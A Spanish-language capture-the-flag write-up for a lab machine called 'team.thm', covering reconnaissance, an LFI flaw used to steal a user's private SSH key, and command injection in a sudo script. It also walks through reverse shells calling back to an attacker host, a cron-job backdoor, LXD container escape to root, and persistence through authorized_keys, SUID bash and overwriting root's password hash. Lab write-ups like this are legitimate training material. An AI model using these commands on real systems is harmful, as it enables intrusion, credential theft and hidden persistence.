# <font color=red>[+]</font> Reconocimiento

```bash
sudo nmap -p- -Pn -n -sS -vvv --min-rate 5000 $IP

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 62
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62
```

```bash
sudo nmap -p 21,22,80 -Pn -n -sVC -v -oN versiones.nmap $IP

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 67:e0:99:1a:b5:22:ac:8c:27:8b:cc:7d:e0:88:df:ec (RSA)
|   256 05:b2:d6:28:0e:b4:f5:8a:03:5b:17:47:14:13:64:33 (ECDSA)
|_  256 20:1d:2b:e4:de:98:11:10:24:f8:ce:9c:13:a3:46:5a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que el puerto `21 ftp` está abierto, pero si tratamos de conectarnos como usuario `anonymous` no podremos autenticarnos de forma exitosa. Por lo tanto, seguimos auditando el servicio ***HTTP***.
## <font color=red>[~]</font> HTTP

En el escaneo de ***Nmap*** podemos apreciar el título de la página web.
```
Apache2 Ubuntu Default Page: It works! If you see this add 'te...
```

Esto nos indica que la página web que ha encontrado ***Nmap*** es el `index.html` por defecto de ***Apache***. Sin embargo, parece haber algo más.

>[!tip]
>Para verlo podemos navegar haciendo uso de un navegador web y pulsando la tecla `F12` o `CTRL+U` para ver el código fuente.
>O
>Realizando una petición `GET` con la herramienta `curl`, la cual nos permite ver la etiqueta `<title>` sin la necesidad de salir de la terminal.
>```bash
>curl http://$IP | head -n 20
>
><title>Apache2 Ubuntu Default Page: It works! If you see this add 'team.thm' to your hosts!</title>
>```
>- `head -n 20`: Nos permite ver las primeras 20 líneas del código fuente, lo que debería ser más que de sobra para ver el contenido de la etiqueta `<title>`.

Vemos que nos indican que debemos de añadir el dominio `team.thm` al archivo `/etc/hosts`. Parece ser que la web es un ***Based-Name Virtual Hosting***, por lo que debemos de añadir el dominio al fichero mencionado con la finalidad de poder acceder a la web real que estamos auditando.
```bash
sudo vim /etc/hosts

$IP    team.thm
```
### <font color=red>[-]</font> Código fuente

Cuando accedemos a la web vemos que la interfaz web consiste en un sitio web que utiliza un *layout* de ***TEMPLATED.co (HTML5/CSS3)***.

El código fuente no presenta información sensible más allá de algunos directorios de imágenes y scripts de *JQuery* y *Skell*. Lo que llama mi atención son los directorios `images/fulls/` y `images/thumbs/`, los cuales parecen tener las mismas imágenes enumeradas del `01.jpg` al `07.jpg`. Esto me da la idea de probar una ***Predictable Resource Location*** de tipo ***Sequential Enumeration***.

```bash
ffuf -c -w <(seq -w 0 99 | sed 's/$/.jpg/') -u http://team.thm/images/fulls/FUZZ -fc 404

ffuf -c -w <(seq -w 0 99 | sed 's/$/.jpg/') -u http://team.thm/images/thumbs/FUZZ -fc 404
```

No encontramos nada.
### <font color=red>[-]</font> Fuzzing

Comenzamos la etapa de reconocimiento activo del entorno web. Buscamos directorios y *endpoints* ocultos para ver más información.

```bash
ffuf -c -w /usr/share/seclist/Discovery/Web-Content/raft-large-files.txt -u http://team.thm/FUZZ -fc 404

index.html              [Status: 200, Size: 2966, Words: 140, Lines: 90, Duration: 29ms]
.htaccess               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 28ms]
robots.txt              [Status: 200, Size: 5, Words: 1, Lines: 2, Duration: 28ms]
.                       [Status: 200, Size: 2966, Words: 140, Lines: 90, Duration: 28ms]
.html                   [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 28ms]
.php                    [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 29ms]
<snip>
```

>[!Note]
>Parece que la web podría funcionar bajo `PHP`

```bash
ffuf -c -w /usr/share/seclist/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -u http://team.thm/FUZZ -fc 404

images                  [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 29ms]
scripts                 [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 29ms]
assets                  [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 29ms]
server-status           [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 32ms]
```

Podemos usar el navegador web para inspeccionar el directorio `images` completo. Sin embargo, los directorios `scripts` y `assets` requieren de permisos para acceder a ellos y nos devolverán un error `403 Forbidden`.

Hasta le momento, no hemos encontrado nada de interés. En el ***Pentesting*** no existe un único camino para comprometer los sistemas, por lo que ahora existen (hasta donde yo he encontrado) dos formas de seguir con el ***CTF***.

>[!tip]
>1. ***Enumeración de subdominios***
>   Al no encontrar información útil en los directorios y *endpoints* existentes en el dominio actual, decidí que era el momento de tratar de averiguar si existían subdominios.
>   
>   ```bash
>ffuf -c -w  /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://team.thm -H "Host: FUZZ.team.thm" -fc 404 -fs 0
>   ```
>   
>   Esto nos mostrará que el dominio hace uso de un sistema ***Catch-all*** o ***Wildcard***, por lo que filtraremos además por el tamaño de la respuesta que para la mayoría es de `11366`.
>   
>   ```bash
>   ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://team.thm -H "Host: FUZZ.team.thm" -fc 404 -fs 11366
>   
>   www                     [Status: 200, Size: 2966, Words: 140, Lines: 90, Duration: 37ms]
>www.dev                 [Status: 200, Size: 187, Words: 20, Lines: 10, Duration: 37ms]
>dev                     [Status: 200, Size: 187, Words: 20, Lines: 10, Duration: 1933ms]
>   ```
>   Encontramos tres subdominios los cuales si añadimos al fichero `/etc/hosts`, podremos navegar a ellos.
>   
>   Lo interesante se encuentra dentro de los subdominios `dev` y `www.dev` (los cuales parecen dar la mima información).
>
>   ---
>2. ***Fichero script.txt***
>   Si hacemos ***Fuzzing*** sobre el directorio `scripts`, veremos que existe un fichero llamado `script.txt`, el cual nos da un código en `bash` de la gestión del servicio `ftp`, y un mensaje en el que se nos indica que en la versión anterior del código (que se encunetra en el mismo directorio `scripts`) se encontraban las credenciales *hardcodeadas*.
>   
>   Sabiendo esto, nuestra misión es encontrar el archivo que contiene la versión anterior del código con la finalidad de obtener las credenciales.
>   
>   Como ir probando manualmente las posibles extensiones puede ser tedioso y provocar errores, he creado un pequeño script en `bash` que automatiza las peticiones de varias de las posibles extensiones. [***Código Bash***](./enumeration_bash.sh)
>
>Encontramos el archivo con el código que contiene las credenciales *hardoceadas* y accedemos al servicio `ftp`.
>```bash
>ftp [hidden]@team.thm
>```
>Es posible que cuando tratemos de listar el contenido del servidor FTP se quede esperando de forma indefinida. En ese caso tan solo debemos usar el comando `passive`.
>
>Encontramos un directorio `workshare` con un fichero `New-site.txt`. Usamos el comando `get New-site.txt` para descargarlo y ver su contenido.
>
>Dentro del fichero hay un mensaje que indica que se está desarrollando un nuevo subdominio `dev`, y una instrucción para el usuario `Dale` que indica que debe de copiar su ***clave SSH privada*** en un archivo de configuración.
   
   Cuando accedemos a dichos subdominios, vemos una página muy simple en el que se nos indica que el sitio está siendo desarrollado y se nos da un enlace el cual lleva a `script.php?page=teamshare.php`. Si accedemos a él no se nos dará más información, pero el parámetro `?page` es bastante sospechoso. Si modificamos la URL para que cargue un archivo diferente a `teamshare.php` observamos que el vulnerable a ***Path Traversal***.
```bash
   curl http://www.dev.team.thm/script.php?page=/etc/passwd
   
   root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   bin:x:2:2:bin:/bin:/usr/sbin/nologin
   sys:x:3:3:sys:/dev:/usr/sbin/nologin
   <snip>
```
  
   Guardamos el archivo para tenerlo a menos por si tenemos que procesarlo para más información.
   ```bash
   curl http://www.dev.team.thm/script.php?page=/etc/passwd > passwd_victim
   ```
 
   Sabemos que el parámetro `?page` es vulnerable a ***Path Traversal***, pero tiene pinta de ir mucho más allá. Al ser cargado desde un archivo `.php` es muy posible que estemos frente a una vulnerabilidad ***LFI (Local File Inclusion)***. Para probarlo trataremos de obtener el contenido del fichero `script.php`.
   ```bash
   curl http://www.dev.team.thm/script.php?page=script.php
   ```
  
   Si no obtenemos respuesta significará, la mayoría de las veces, que ha funcionado.
   El hecho de que no veamos el código fuente del archivo PHP, sino una página en blanco o un cambio en el comportamiento, se debe a que las funciones vulnerables a LFI (como `include`) pasan el contenido del archivo por el **intérprete de PHP**.
   Si el archivo contiene etiquetas de código válidas, el servidor las ejecutará en lugar de mostrarlas como texto. La falta de salida visual en el navegador sugiere que el código se procesó en el lado del servidor, aunque el éxito real debe confirmarse mediante la ejecución de la tarea específica que el código debía realizar.

Como no he encontrado forma de subir un archivo con código PHP para ejecutarlo haciendo uso del ***LFI*** para generar una ***reverse shell***. He optado por hacer fuerza bruta para leer archivos críticos del sistema.
```bash
ffuf -c -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://dev.team.thm/script.php?page=FUZZ -fc 404 -fs 1

/etc/passwd             [Status: 200, Size: 2203, Words: 18, Lines: 43, Duration: 44ms]
/etc/apache2/apache2.conf [Status: 200, Size: 7313, Words: 944, Lines: 231, Duration: 46ms]
/etc/lsb-release        [Status: 200, Size: 105, Words: 3, Lines: 6, Duration: 43ms]
/etc/mtab               [Status: 200, Size: 3319, Words: 216, Lines: 45, Duration: 43ms]
/etc/network/interfaces [Status: 200, Size: 91, Words: 13, Lines: 6, Duration: 43ms]
/etc/networks           [Status: 200, Size: 92, Words: 11, Lines: 4, Duration: 43ms]
/etc/profile            [Status: 200, Size: 582, Words: 145, Lines: 29, Duration: 43ms]
/etc/resolv.conf        [Status: 200, Size: 752, Words: 99, Lines: 21, Duration: 43ms]
/etc/ssh/ssh_config     [Status: 200, Size: 1604, Words: 245, Lines: 54, Duration: 43ms]
/etc/ssh/sshd_config    [Status: 200, Size: 6013, Words: 305, Lines: 170, Duration: 44ms]
/etc/vsftpd.conf        [Status: 200, Size: 5937, Words: 806, Lines: 161, Duration: 45ms]
<snip>
```

Vemos que podemos leer el contenido del archivo `/etc/ssh/sshd_config` el cual dentro contiene la ***clave SSH privada de Dale***. Tan solo debemos copiarla, cambiar sus permisos con `chmod 600 dale.key` y acceder vía ***ssh*** con `ssh dale@team.thm -i dale.key`.

El problema que tenemos es que cuando copiamos la clave privada, esta se encuentra comentada dentro del archivo de configuración, y por lo tanto, al inicio de cada línea tiene un `#`. Para limpiar la clave ejecutamos:
```bash
sed 's/^#//' clave_sucia > dale.key
# Este comando elimina todos los # que se encuentran al inicio de una línea
```
# <font color=red>[+]</font> Post-Explotación

Accederemos al sistema como el usuario ***dale***, el cual cuenta con algunos permisos. Sin embargo, nuestro objetivo es escalar privilegios para ser el usuario ***root***. Aquí he encontrado dos caminos posibles:
## <font color=red>[~]</font> Ruta larga

Si ejecutamos el comando `sudo -l` con el usuario ***dale*** observamos que podemos ejecutar el script `/home/gyles/admin_checks` como el usuario ***gyles***. Esto nos puede servir para realizar una escalada de privilegios horizontal y poder ampliar nuestra zona de ataque para la escalada de privilegios vertical al usuario ***root***.

El script en `/home/gyles/admin_checks` es el siguiente:
```bash
cat /home/gyles/admin_checks

#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```

Observamos que en dos ocasiones se pide información al usuario para realizar el flujo de trabajo del script. Sin embargo, vemos que el segundo `input`, que se almacena en la variable `$error`, se ejecuta más adelante sin mostrar la salida pro pantalla. Esto nos puede servir para ejecutar comandos del sistema como el usuario ***gyles***:

```bash
sudo -u gyles /home/gyles/admin_checks

Reading stats.
Reading stats..
Enter name of person backing up the data: juan  # Primer input del usuario
Enter 'date' to timestamp the file: /bin/bash   # Segundo input del usuario
The Date is ahora
id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),108(lxd),1003(editors),1004(admin)
```

Aquí obtendremos una shell de `bash` gracias a que el script ejecuta lo que le mandemos sin sanitizarlo de alguna forma. No obstante, no es una ***pty*** y puede ser incómodo trabajar en ella. para ello, podemos generar una ***pty*** de varias formas (aquí veremos dos pero hay muchas más):

1. ***Realizando una reverse shell***

   Podemos generar una reverse shell indicándole al sistema que genere una shell y la trabaja a través de una conexión directa a nuestra máquina atacante:
   ```bash
   # En nuestra máquina atacante preparamos el puerto 4444 para recibir la reverse shell
   nc -lvnp 4444
   
   # En la máquiona víctima, tal como ejecutamos el comando id, ejecutamos la siguiente instrucción
   /bin/bash -c '/bin/bash -i >& /dev/tcp/IP_KALI_4444 0>&1'
   ```
   
   Ya tenemos una ***pty*** como el usuario ***gyles***.
   
2. ***Ruta corta***

No es necesario realizar una reverse shell para conseguir una ***pty***, podemos aprovechar que `python3` está instalado en la máquina (`which python3`) y generar una ***pty*** que se ejecutará como el usuario ***gyles***.
   ```bash
   # En la máquina víctima, tal como ejecutamos el comando id, ejecutamos la siguiente instrucción
   python3 -c 'import pty;pty.spwan("/bin/bash")'
   ```

Una vez somos el usuario `gyles` podemos leer el historial de comandos de `.bash_history` ene l que podemos ver que existe un archivo `/usr/local/bin/main_backup.sh` que pertenece al grupo `admin`. ***gyles*** también pertenece a ese grupo `admin` y tiene permisos para escribir en él.

También vemos que parece que se usa `cron` para la automatización de tareas, por lo que añadimos una reverse shell al archivo `main_backup.sh` para que cuando se ejecute como el usuario `root` nos llegue dicha reverse shell.

```bash
# En nuestra máquina atacante preparamos el puerto 4444 para recibir la reverse shell
nc -lvnp 5555

# En la archivo main_backup.sh añadimos:
/bin/bash -c '/bin/bash -i >& /dev/tcp/IP_KALI_5555 0>&1'
```
## <font color=red>[~]</font> Ruta corta

Si usamos el comando `id` observamos que el usuario ***dale*** pertenece al grupo `lxd`.

>[!Note]
>`LXD` es un gestor de contenedores. Si un usuario pertenece a este grupo, tiene permiso para crear contenedores con privilegios de administrador y, lo más importante, puede ***montar el disco duro completo de la máquina hosts*** dentro de el contenedor.

1. ***Preparación de la Imagen***
   Como el servidor objetivo no tiene conexión a Internet, necesitamos enviarla una imagen ligera de Linux (***Alpine*** es la estándar).
	  1. ***Descargamos el constructor de Apline para LXD***
    Para esto recomiendo crear un directorio temporal en `/tmp`.
 	     ```bash
 	     cd $(mktemp -d)
 	     ```
 	     Tras esto, comenzamos la descarga y generación del constructor:
 	     ```bash
 	     git clone https://github.com/saghul/lxd-alpine-builder.git
 	     cd lxd-alpine-builder
 	     sudo ./build-alpine
 	     ```
 	     Esto generará un archivo `.tar.gz` (ej. `alpine-ve.13-x86_64-20210218_0139.tar.gz`).
 	     <br>
 	  2. ***Transferimos el archivo*** al servidor (podemos usar `python3 -m http.server` en nuestra máquina atacante para crear un servidor HTTP simple desde el que podamos descargar el archivo desde el servidor usando `wget`).
 	     ```bash
 	     # En el servidor víctima
 	     ## Nos movemos a un directorio temporal para no dejar rastro evidente y fácil de detectar
 	     cd $(mktemp -d)
 	     
 	     ## Descargamos el constructor que hemos generado
 	     wget http://IP_KALI:8000/alpine-ve.13-x86_64-20210218_0139.tar.gz
 	     ```
 2. ***Importación y Explotación***
    Una vez tengamos el archivo en la carpeta `/tmp` de la víctima:
 	   1.***Importamos la imagen***
 	   ```bash
 	   lxc image import ./alpine-v3.13-x86_64-xxxxxxxx.tar.gz --alias myimage
 	   ```
 	   Comprobamos que aparece con `lxc image list`.
 	   <br>
	 	   2. ***Inicializamos el contenedor con privilegios***
 Vamos a crear un contendor que tenga permisos totales y que monte la raíz (`/`) del sistema host en un directorio interno.
	 ```bash
	lxc init myimage ignite -c security.privileged=true
	lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
	 ```
	Es posible que cuando ejecutemos el primer comando nos salga el siguiente error:
	```
	Creating ignite
	Error: No storage pool found. Please create a new storage pool
	```
	Esto quiere decir que el servicio `LXD` está instalado pero ***no ha sido inicializado***, por lo que no tiene un "*pool*" (un espacio en el disco) asignado para crear contendores.
	
	Para solucionarlo, tan solo debemos de configurar rápidamente `LXD`. No necesitamos complicarnos mucho, únicamente le daremos los valores por defecto.
	
	- Ejecutamos el siguiente comando para inicializar el servicio:
	  ```bash
	  lxd init
	  ```
	  El asistente nos hará una serie de preguntas. Para una escalada de privilegios debemos de darle ***Enter*** a todas para usar las opciones por defecto, pero debemos de fijarnos en estas:
	  1. **Would you like to use LXD clustering?** (Default: no) -> **Enter**
	  2. **Do you want to configure a new storage pool?** (Default: yes) -> **Enter**
	  3. **Name of the new storage pool?** (Default: default) -> **Enter**
	  4. **Name of the storage backend to use?** Aquí, si nos da a elegir, elegimos **`dir`** (es el más sencillo y no suele fallar). Si sale `zfs` o `btrfs` por defecto y no funciona, probamos con `dir`.
	  5. **Would you like to connect to a MAAS server?** (Default: no) -> **Enter**
	  6. **Would you like to configure a new local network bridge?** (Default: yes) -> **Enter** ... y así hasta el final.
	     
	     Tras esto, reintentamos el *exploit*:
	     1. ***Creamos el contenedor privilegiado:***
	        ```
	        lxc init myimage ignite -c security.privileged=true
	        ``` 
	     2. ***Montamos el disco duro de la máquina real (Host) en el contenedor:***
	        ```bash
	        lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
	        ```
	     3. ***Arrancamos y entramos:***
	        ```bash
	        lxc start ignite
	        lxc exec ignite /bin/sh
	        # Debemos de usar sh y nos bash ya que las imágenes de Alpine son tan minimalistas que no incluyen bash, solo el shell estándar de BusyBox
	        ```
	        
	        Estaremos dentro del contenedor que acabamos de crear. Pero recordemos que hemos montado el sistema de ficheros del sistema host en `/mnt/root`, por lo que para escapar al sistema eral tan solo debemos de movernos hacia ese directorio usando `cd`. Una vez dentro, ya tendremos permisos de adminsitrador en el sistema real.

## De `sh` a `bash`
Aunque ya hemos conseguido escalar privilegios, usar `sh` es mucho más incómodo que usar `bash`. Si queremos cambiar a una shell en `bash` tenemos varias opciones.

1. ***SSH***
Podemos aprovechar el servicio `ssh` creando un par de claves en nuestra máquina atacante e incluyendo nuestra clave pública en el archivo `/root/.ssh/authorized_keys`.
```bash
# En nuestra máquina atacante
ssh-keygen -t rsa -f id_rsa_kali -N ""
```

Esto nos creará dos ficheros, una clave pública (`.pub`) y una clave privada (`.key` o sin extensión). Tan solo deberemos de copiar todo el contenido de la ***clave pública*** y copiarla en el servidor.
>[!important]
>***Alpine*** es tan minimalista que no incluye editores de texto como `nano` o `vim`, por lo que lo más cómodo para añadir la clave a `authorized_keys` es usar `echo`:
>```bash
>echo "[Contenido de la clave pública]" >> authorized_keys
>```
>Es ***MUY IMPORTANTE*** usar `>>`, ya que si tan solo usamos `>` se borrará todo el contenido del fichero y añadirá tan solo nuestra clave, lo cual es una muy mala práctica en cuanto a persistencia.
 
 Una vez hayamos añadido la clave pública al archivo `authorized_keys`, debemos de cambiar los permisos de nuestra clave privada:
 ```bash
 chmod 600 id_rsa_kali
 ```

Ahora podremos conectarnos como `root` vía ***ssh***:
```bash
ssh root@team.thm -i id_rsa_kali
```
---
2. ***Bit SUID a `/bin/bash`***
   Podemos activar el ***bit SUID*** al binario `bash` para así poder ejecutarlo como `root`.
   ```bash
   chmod +s /mnt/root/bin/bash
   ```
   Nos volvemos a conectar como el usuario `dale` y ejecutamos:
   ```bash
   /bin/bash -p
   ```
---
3. ***Cambiar contraseña del usuario `root`***
   Podemos generar un nuevo hash desde nuestra máquina atacante para intercambiarla por el hash actual del usuario `root`.
   ```bash
   # 1. En nuestra máquina atacante creamos el nuevo hash
   openssl passwd -1 -salt xyz password123
   
   # 2. En el servidor, dentro del contendor con privilegios de root, usamos sed para el intercambio
   sed -i 's|^root:[^:]*:|root:<Nuestro_Hash>:|' /mnt/root/etc/shadow
   ```
   
   Nos volvemos a conectar como el usuario ***dale*** y usamos la contraseña que acabamos de modificar.
   ```bash
   su
   ```
